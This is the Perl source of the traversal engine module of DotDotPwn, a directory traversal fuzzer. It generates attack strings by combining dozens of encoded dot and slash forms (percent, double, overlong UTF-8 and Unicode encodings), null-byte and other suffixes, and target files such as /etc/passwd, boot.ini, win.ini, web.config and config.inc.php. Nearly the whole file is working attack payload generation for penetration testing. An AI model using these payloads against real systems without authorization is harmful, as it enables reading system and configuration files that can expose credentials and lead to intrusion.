#!/usr/bin/perl
# 
# Traversal Engine
# by nitr0us (nitrousenador@gmail.com)
# http://twitter.com/nitr0usmx
# http://chatsubo-labs.blogspot.com
#
#
# This is the CORE module because of here resides the main
# functionality to make all the combinations between the dots,
# slashes and filenames to make the traversal strings.
#
# Once created the traversal patterns (mix of dots and slashes 
# such as "../", "..%2f", etc.), the engine combines all these
# patterns with the corresponding filenames depending on the 
# Operating System detected (in case of -O switch is enabled) 
# and all the Extra filenames (in case of -E switch is enabled).
# If the -O switch is not enabled, the Engine combiness the 
# Windows and UNIX filenames (not including the Extra filenames
# unless the -E switch is enabled).
#
# Finally, the Engine returns an array containing a list of the
# traversal strings to be launched against the specified target.
#

package DotDotPwn::TraversalEngine;
use Exporter 'import';
@EXPORT = qw(TraversalEngine);

#use Switch;

# Traversal strings to be returned (and after, launched against the target).
my @Traversals;

# Specific files in Windows b0xes
my @Windows_files = ('boot.ini', '\windows\win.ini', '\windows\system32\drivers\etc\hosts');
                     # "autoexec.bat"); YOU CAN ALSO ADD THESE AND MORE UNDER YOUR CONSIDERATION

# Specific files in UNIX-based b0xes
my @Unix_files = ('/etc/passwd', '/etc/issue');
                  # "/etc/motd", /etc/issue.net"); YOU CAN ALSO ADD THESE AND MORE UNDER YOUR CONSIDERATION

# Extra files (only included if -E switch is enabled)
my @Extra_files = ("config.inc.php", "web.config");
                   # "/etc/mysql/my.cnf", "/etc/httpd/conf/httpd.conf", "/etc/httpd/httpd.conf",
                   # "\\inetpub\\wwwroot\\web.config"); #YOU CAN ALSO ADD THESE AND MORE UNDER YOUR CONSIDERATION

# Dots (..) representations to be combined in the Traversal Engine
our @Dots = ("..",
             ".%00.",
             "..%00",
             "..%01",
             ".?", "??", "?.",
             "%5C..",
             ".%2e", "%2e.",
             ".../.",
             "..../",
             "%2e%2e", "%%c0%6e%c0%6e",
             "0x2e0x2e", "%c0.%c0.",
             "%252e%252e",
             "%c0%2e%c0%2e", "%c0%ae%c0%ae",
             "%c0%5e%c0%5e", "%c0%ee%c0%ee",
             "%c0%fe%c0%fe", "%uff0e%uff0e",
             "%%32%%65%%32%%65",
             "%e0%80%ae%e0%80%ae",
             "%25c0%25ae%25c0%25ae",
             "%f0%80%80%ae%f0%80%80%ae",
             "%f8%80%80%80%ae%f8%80%80%80%ae", 
             "%fc%80%80%80%80%ae%fc%80%80%80%80%ae");

# Slashes (/ and \) representations to be combined in the Traversal Engine
our @Slashes = ("/", "\\",
                "%2f", "%5c",
                "0x2f", "0x5c",
                "%252f", "%255c",
                "%c0%2f", "%c0%af", "%c0%5c", "%c1%9c", "%c1%pc",
                "%c0%9v", "%c0%qf", "%c1%8s", "%c1%1c", "%c1%af",
                "%bg%qf", "%u2215", "%u2216", "%uEFC8", "%uF025",
                "%%32%%66", "%%35%%63",
                "%e0%80%af",
                "%25c1%259c", "%25c0%25af",
                "%f0%80%80%af",
                "%f8%80%80%80%af");


# Special prefixes, sufixes and traversal patterns to be combined. After that, all the
# resulting strings would be contained in the array @Traversal_Special, which would be appended
# to the array @Traversals in the Engine.
#
# This Special patterns and strings will not be combined in the Traversal Engine because
# of it would increase drastically the number of Traversals.
#
my  @Special_Prefix_Patterns = ("A", ".", "./", ".\\");
my  @Special_Prefixes = ("///", "\\\\\\", "\\\.", "../../foo/", "C:\\");
my  @Special_Mid_Patterns = ("../", "..\\");
my  @Special_Sufixes = ("%00", "?", " ", "%00index.html", "%00index.htm", ";index.html", ";index.htm");
our @Special_Patterns = ("..//", "..///", "..\\\\", "..\\\\\\", "../\\", "..\\/",
                         "../\\/", "..\\/\\", "\\../", "/..\\", ".../", "...\\",
                        "./../", ".\\..\\", ".//..//", ".\\\\..\\\\","......///",
                        "%2e%c0%ae%5c", "%2e%c0%ae%2f");


# Traversal Engine
# by nitr0us (nitrousenador@gmail.com)
# http://twitter.com/nitr0usmx
# http://chatsubo-labs.blogspot.com
#
# This engine build the strings according to the deep (-d parameter) provided in the command
# line. To perform the test in an intelligent way, if the -O switch (Operating System detection) 
# was enabled, it will include only the specific files for the OS detected.
#
# Also, if the Traversal Pattern includes backslashes (..\..\), then, the slashes in filenames 
# will be replaced with backslashes and vice versa. Then /etc/passwd mixed with the traversal 
# pattern ..\..\..\ would become ..\..\..\etc\passwd and \inetpub\wwwroot\web.config mixed with
# ../../../ would become ../../../inetpub/wwwroot/web.config. It also take into account the
# different representations, e.g. /etc/passwd will be translated to %2fetc%2f in case of the %2f
# was used in the traversal pattern.
#
sub TraversalEngine{
	my ($OS_type, $deep, $file) = @_;
	my @Traversal_Patterns; # Combinations of dots and slashes
	my @Traversal_Strings;  # Repetitions of @Traversal_Patterns $deep times
	my @Traversal_Special;  # Combinations of @Special_* arrays

	print "[+] Creating Traversal patterns (mix of dots and slashes)\n" if $main::module ne "stdout";
	foreach $dots (@Dots){
		foreach $slash (@Slashes){
			push @Traversal_Patterns, $dots . $slash;
		}
	}

	if($main::bisect){
		print "[+] Multiplying $main::bisdeep times the traversal patterns (Bisection Algorithm enabled)\n" if $main::module ne "stdout";
	} else {
		print "[+] Multiplying $deep times the traversal patterns (-d switch)\n" if $main::module ne "stdout";
	}

	foreach $pattern (@Traversal_Patterns){
		for(my $k = ($main::bisect ? $main::bisdeep : 1); $k <= ($main::bisect ? $main::bisdeep : $deep); $k++){
			push @Traversal_Strings, $pattern x $k;
		}
	}

	### SPECIAL TRAVERSALS ###
	print "[+] Creating the Special Traversal patterns\n" if $main::module ne "stdout";
	foreach $sp_pat (@Special_Patterns){
		for(my $k = ($main::bisect ? $main::bisdeep : 1); $k <= ($main::bisect ? $main::bisdeep : $deep); $k++){
			push @Traversal_Special, $sp_pat x $k;
		}
	}

	foreach $sp_prfx_pat (@Special_Prefix_Patterns){
		$sp_trav = $sp_prfx_pat x 512;

		foreach $sp_mid_pat (@Special_Mid_Patterns){
			for(my $k = ($main::bisect ? $main::bisdeep : 1); $k <= ($main::bisect ? $main::bisdeep : $deep); $k++){
				push @Traversal_Special, $sp_trav . ($sp_mid_pat x $k); 
			}
		}
	}

	foreach $sp_prfx (@Special_Prefixes){
		foreach $sp_mid_pat (@Special_Mid_Patterns){
			for(my $k = ($main::bisect ? $main::bisdeep : 1); $k <= ($main::bisect ? $main::bisdeep : $deep); $k++){
				push @Traversal_Special, $sp_prfx . ($sp_mid_pat x $k);
			}
		}
	}
	### SPECIAL TRAVERSALS ###

	push @Traversal_Strings, @Traversal_Special;

	print "[+] Translating (back)slashes in the filenames\n" if $main::module ne "stdout"; # Done below

	if(!$file){
		print "[+] Adapting the filenames according to the OS type detected (" . $OS_type . ")\n" if $main::module ne "stdout";
		foreach $trav (@Traversal_Strings){
			# switch($OS_type){
		        if ($OS_type eq "unix") {
				foreach $filename (@Unix_files){
					$fname = fname_first_slash_deletion($filename);
					push @Traversals, $trav . fname_slash_encoding($fname, $trav);
				}
			}
		        if ($OS_type eq "windows") {
				foreach $filename (@Windows_files){
					$fname = fname_first_slash_deletion($filename);
					push @Traversals, $trav . fname_slash_encoding($fname, $trav);
				}
			}
			if ($OS_type eq "generic") {
				foreach $filename (@Unix_files){
					$fname = fname_first_slash_deletion($filename);
					push @Traversals, $trav . fname_slash_encoding($fname, $trav);
				}
				foreach $filename (@Windows_files){
					$fname = fname_first_slash_deletion($filename);
					push @Traversals, $trav . fname_slash_encoding($fname, $trav);
				}
			}
			#}

			# Inclusion of the extra files if the -E switch is enabled
			if($main::extra_f){
				foreach $filename (@Extra_files){
					$fname = fname_first_slash_deletion($filename);
					push @Traversals, $trav . fname_slash_encoding($fname, $trav);
				}
			}
		}
	} else {
		print "[+] Appending '$file' to the Traversal Strings\n" if $main::module ne "stdout";
		foreach $trav (@Traversal_Strings){
			$fname = fname_first_slash_deletion($file);
			push @Traversals, $trav . fname_slash_encoding($fname, $trav);
		}
	}

	print "[+] Including Special sufixes\n" if $main::module ne "stdout";
	# Finally, include the sufixes in @Special_Sufixes
	if(!$file){
		#switch($OS_type){
	        if ($OS_type eq "unix") {
			foreach $filename (@Unix_files){
				special_trav_sufixes($filename, $deep);
			}
		}
		if ($OS_type eq "windows") {
			foreach $filename (@Windows_files){
				special_trav_sufixes($filename, $deep);
			}
		}
		if ($OS_type eq "generic") {
			foreach $filename (@Unix_files){
				special_trav_sufixes($filename, $deep);
			}
                        foreach $filename (@Windows_files){
				special_trav_sufixes($filename, $deep);
			}
		}
		#}

		# Inclusion of the extra files if the -E switch is enabled
		if($main::extra_f){
			foreach $filename (@Extra_files){
				special_trav_sufixes($filename, $deep);
			}
		}
	} else {
		special_trav_sufixes($file, $deep);
	}

	# Append the file extension to each fuzz string if the -e switch is enabled
	if($main::extens){
		print "[+] Appending the file extension " . $main::extens . " to each fuzz string\n" if $main::module ne "stdout";

		foreach $traversal (@Traversals){
			$traversal .= $main::extens;	
		} 
	}

	return @Traversals;
}


sub fname_slash_encoding{
	my ($fname, $trav) = @_;

	# Taken from @Special_Patterns but without dots
	my @Special_Slashes = ("//", "///", "\\\\", "\\\\\\", "/\\", "\\/", "/\\/", "\\/\\");

	# Return the unmodified filename when it doesn't contain / or \
	return $fname unless (($fname =~ /\//) || ($fname =~ /\\/));

	my @All_Slashes;
	push @All_Slashes, @Slashes;
	push @All_Slashes, @Special_Slashes;

	# Reverse order to start the matching with the largest encoding representations
	# N-byte... 4-byte, 3-byte, and so on
	foreach (reverse @All_Slashes){
		# Reverse order in the next lines to match the last slash or backslash representation.
		# e.g. ///..\..\..\ MUST match the last backslash used, which in this case is '\',
		# so, the traversal string will be ///..\..\..\etc\passwd and NOT ///..\..\../etc/passwd ;)
		my $rev_trav = reverse $trav;
		my $rev_regex = reverse $_;

		# Regex masquerading to avoid \ and / problems
		if($rev_regex =~ /\\/){
			$rev_regex =~ s/\\/\\\\/g;
		}

		if($rev_regex =~ /\//){
			$rev_regex =~ s/\//\\\//g;
		}

		# Replace / and \ by it's corresponding representation detected in the current traversal string
		if($rev_trav =~ /$rev_regex/){
			if($fname =~ /\//){ $fname =~ s/\//$_/g; }
			elsif($fname =~ /\\/){ $fname =~ s/\\/$_/g; }

			return $fname;
		}
	}
}

# Include the Special Traversals with @Special_Sufixes
sub special_trav_sufixes{
	my ($filename, $deep) = @_;

	foreach $sp_mid_pat (@Special_Mid_Patterns){
		for(my $k = ($main::bisect ? $main::bisdeep : 1); $k <= ($main::bisect ? $main::bisdeep : $deep); $k++){
			foreach $sufix (@Special_Sufixes){
				$fname = fname_first_slash_deletion($filename);
				push @Traversals, ($sp_mid_pat x $k) . fname_slash_encoding($fname, $sp_mid_pat) . $sufix;
			}
		}
	}
}

sub fname_first_slash_deletion{
	my $filename = shift;

	# Avoid the first '/' or '\' in the filename in case of.
	return ((substr($filename, 0, 1) eq "/") || (substr($filename, 0, 1) eq "\\")) ? substr($filename, 1) : $filename;
}
